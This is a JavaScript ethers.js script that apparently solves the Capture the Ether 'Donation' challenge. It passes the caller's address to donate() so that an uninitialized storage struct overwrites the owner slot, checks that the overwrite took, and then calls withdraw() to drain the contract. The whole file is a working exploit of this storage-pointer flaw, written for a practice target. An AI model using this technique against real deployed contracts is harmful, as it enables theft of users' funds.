
const { utils, BigNumber, Contract, ethers } = require('ethers');

var { wallet, provider } = require('./common')

const contractAddress = '0x8FEd5E6027BB7bbd127484ba46c12B2ddeF9F364';

// https://medium.com/coinmonks/smart-contract-exploits-part-2-featuring-capture-the-ether-math-31a289da0427
// donation -> [slot 0, slot 1]
async function main() {
	const iface = new utils.Interface([
		'function withdraw()',
		'function owner() view returns (address)',
		'function isComplete() view returns (bool)',
		'function donate(uint256 etherAmount) payable',
		'function donations(uint256) view returns (uint256 timestamp, uint256 etherAmount)',
		'constructor() payable'
	]);
	var address = await wallet.getAddress();

	var etherAmount = BigNumber.from(address).div(BigNumber.from(10).pow(18 + 18));

	var contract = new Contract(contractAddress, iface, provider);
	var contractWithSigner = contract.connect(wallet);

	// step 1: donate
	var tx = await contractWithSigner.donate(address, { value: etherAmount });

	// var result = await tx.wait();
	// console.log('result : ', result);

	// step 2: verify slot 1
	var slot1 = await provider.getStorageAt(contractAddress, 1);
	console.log("slot1: ", slot1, BigNumber.from(slot1).toHexString());
	console.log('address: ', address, BigNumber.from(slot1).eq(BigNumber.from(address)));

	// step 3: withdraw
	var tx = await contractWithSigner.withdraw();
	var result = await tx.wait();
	console.log('result : ', result);
}

main().catch(console.error);